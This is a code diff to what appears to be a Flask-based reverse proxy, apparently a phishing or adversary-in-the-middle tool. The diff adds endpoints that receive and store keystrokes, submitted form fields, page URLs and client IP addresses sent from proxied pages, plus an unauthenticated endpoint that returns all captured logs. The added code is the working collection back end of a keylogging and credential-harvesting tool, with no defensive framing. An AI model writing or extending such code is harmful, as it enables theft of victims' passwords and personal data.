@@ -116,6 +116,58 @@ def start_proxy(target, host, port, secret):
         
         return jsonify({'status': 'success'})
 
+    @app.route('/ep/api/keylog', methods=['POST'])
+    def keylog():
+        data = request.json
+        timestamp = datetime.now().isoformat()
+        log_entry = {
+            'keys': data['keys'],
+            'url': data['url'],
+            'timestamp': timestamp,
+            'ip': request.remote_addr
+        }
+        
+        with open('keylogs.json', 'a+') as f:
+            f.write(json.dumps(log_entry) + '\n')
+        
+        return jsonify({'status': 'success'})
+
+    @app.route('/ep/api/forms', methods=['POST'])
+    def log_form():
+        data = request.json
+        timestamp = datetime.now().isoformat()
+        log_entry = {
+            'fields': data['fields'],
+            'url': data['url'],
+            'timestamp': timestamp,
+            'ip': request.remote_addr
+        }
+        
+        with open('forms.json', 'a+') as f:
+            f.write(json.dumps(log_entry) + '\n')
+        
+        return jsonify({'status': 'success'})
+
+    @app.route('/ep/api/getLogs', methods=['GET'])
+    def get_logs():
+        log_type = request.args.get('type', 'all')
+        logs = {
+            'keylogs': [],
+            'forms': []
+        }
+        
+        if os.path.exists('keylogs.json'):
+            with open('keylogs.json', 'r') as f:
+                logs['keylogs'] = [json.loads(line) for line in f]
+            
+        if os.path.exists('forms.json'):
+            with open('forms.json', 'r') as f:
+                logs['forms'] = [json.loads(line) for line in f]
+        
+        if log_type != 'all':
+            return jsonify(logs[log_type])
+        return jsonify(logs)
+
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     def proxy(path):
